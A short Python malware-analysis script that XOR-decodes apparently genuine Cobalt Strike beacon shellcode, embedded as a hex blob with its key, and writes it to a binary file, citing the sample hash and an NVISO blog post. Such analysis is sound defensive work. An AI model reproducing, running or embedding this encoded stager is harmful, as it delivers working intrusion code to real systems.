# decode shellcode in cobalt strike beacon
# sample: a01ebc2be23ba973f5393059ea276c245e6cea1cd1dc3013548c059e810b83e6
# reference: https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/

data = bytes.fromhex("29 8E FD 99 25 2E B6 7D D5 C6 3F 2C 94 96 2C 2C 83 8E 4F AF B0 8E F5 2F B5 8E F5 2F CD 8E F5 2F F5 8E F5 0F 85 8E 71 CA 9F 8C 33 4C 1C 8E 4F BD 79 FA 1F 01 D7 EA 5E 3C 14 0F 73 3C D4 07 9C 90 87 87 2F 35 5E 94 5E F6 97 FA 36 7C 05 A0 FF 05 CD CD 7C 08 A7 4D FE F5 D5 C6 7E 35 50 06 0A 1A 9D C7 AE 2D 5E 8E 66 39 5E 86 5E 34 D4 16 9D 2B 9D 39 B7 3C 5E F2 F6 35 D4 10 33 4C 1C 8E 4F BD 79 87 BF B4 D8 87 7F BC ED 26 0B 8C 99 C5 32 59 DD 83 47 AC A0 1E 26 39 5E 86 5A 34 D4 16 18 3C 5E CA 36 39 5E 86 62 34 D4 16 3F F6 D1 4E 36 7C 05 87 26 3C 8D 98 27 27 94 9E 3F 24 94 9C 36 FE 39 E6 3F 2F 2A 26 26 3C 8C 9C 36 F6 C7 2F 31 82 2A 39 23 17 D5 8F C0 0A BC A8 17 13 B0 B2 7E 3C 83 8F F7 9B 99 4F 8F 3C 6F 8A 09 5B D2 39 AB 35 E4 0F 36 4C 07 8B 4F BD 98 F7 B7 3C 85 87 2E 3C 6F FC 28 04 72 39 AB 94 46 C6 7E 7D 8F 8E F7 BC 94 7E C5 7C D5 C6 33 4C 1C 87 2F 3C 84 AC 7D 3C 84 87 C4 2A 5C 59 B8 82 00 2D 07 26 9D 4F BF 35 E4 14 37 F4 0D 8B 4F B4 87 AE 7E 4F 15 42 2C 2F 94 7C 95 28 FB FD 81 A8 9D 4F B8 35 56 05 2E 17 DF 99 36 F4 24 7C 61 7D D5 C6 14 7D BD 46 4D 7D D5 8F F7 9D 94 7F 7A 7D D5 C6 3F C7 A0 80 E0 FB 2A 13 36 F4 24 8E F7 A7 9C 01 BE 82 2A 39 81 30 E4 0F 2C 2F 94 7C 53 7B CD BD 81 A8 50 06 71 F8 48 C7 7E 7D 9D 39 B1 72 51 4A 7F 7D D5 2D CD 94 31 C7 7E 7D 3D 44 81 82 2A E9 0B 34 9F 93 7E 67 25 9B 8A A8 38 D1 5F 3D E1 31 C7 C2 2E 08 46 9A 1B 21 1F 8A 3F 6D 7D E4 98 5C 01 C1 BB 28 58 27 FC 68 07 7B A9 3D F6 89 03 5F BF 57 30 CE 67 C4 22 26 5F 4C 6A 4B BC 7A 68 0B 35 4E 31 AE DB C6 81 C4 FD 24 03 DF 37 3C D5 93 0D 18 A7 EB 3F 1A B0 A8 0A 47 F5 8B 11 07 BC AA 12 1C FA F3 50 4D F5 EE 1D 12 B8 B6 1F 09 BC A4 12 18 EE E6 33 2E 9C 83 5E 4C E5 E8 4E 46 F5 91 17 13 B1 A9 09 0E F5 88 2A 5D E3 E8 4C 46 F5 91 31 2A E3 F2 45 5D 81 B4 17 19 B0 A8 0A 52 E3 E8 4E 46 F5 8B 3A 39 96 8C 2D 54 D8 CC 7E 45 85 1D 56 72 5B C0 B1 F4 59 93 19 A2 D0 0C C7 39 CC 63 22 E8 B5 6E 13 BA 11 A5 9F 34 C8 DD 27 6A 50 22 6D DD 40 29 3D B5 EF 68 C0 06 C0 98 43 59 F1 1B 5D F8 16 13 F8 9A 8D 9C FB 81 28 66 8F DE A5 83 8E 43 9D 27 47 DB DA 7D 93 BB 90 08 C0 87 16 FB 8E 4F 98 DF 33 E9 CB 58 20 18 1E 01 68 37 50 AB 7F 87 49 2A A0 A8 49 3A A6 59 6D 93 B8 BA 97 54 F3 4C 12 9D C7 B6 F8 11 6D F4 35 F0 15 93 BB 7E 42 05 1E 7E 09 5F AB F8 48 BD E9 13 55 1D F5 08 B0 F6 A9 C8 73 63 7C 22 A4 16 2F EB 7D 2F 87 B0 E7 31 C2 8C 8E E9 0E E9 10 2D AD CF FC 5C 9D 49 D0 A4 D1 35 99 C4 4B 78 2E FA 02 4D 98 58 93 CB C8 1E A5 9E 2F 16 B1 61 4D 1A 1E 9A 4D F7 D5 87 C0 8D 60 64 28 82 00 8E 4F B4 6F C6 7E 3D D5 87 C6 7D C5 C6 7E 3C 6C 86 7E 7D D5 87 C4 25 71 95 9B 82 00 8E ED 2E 86 8E F7 9A 9D 4F 8F 35 5C 1C 3F C5 D5 E6 7E 7D 9C 4F 87 3C 6F D4 E8 F4 37 39 AB 35 56 02 5E F8 15 B2 C8 1B 5E C1 36 7C 16 43 BE 08 02 9E 26 25 9D C3 7E 7D D5 C6 2E BE 3D B9 83 82 2A AC 11 14 BB E8 0B 0E FB A7 0A 53 BB B0 17 0E BA C6 76 89 F6 E0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20")

size = 0x3a2

def decode_shellcode(encoded_shellcode, key, size):
    decoded_shellcode = bytearray(size)
    decoded_shellcode = bytes(encoded_shellcode[i] ^ key[i % len(key)] for i in range(size))

    return decoded_shellcode

key =  b"\xD5\xC6\x7E\x7D"

result = decode_shellcode(data, key, size)

f = open("decoded_shellcode.bin", "wb")
f.write(result)
f.close()


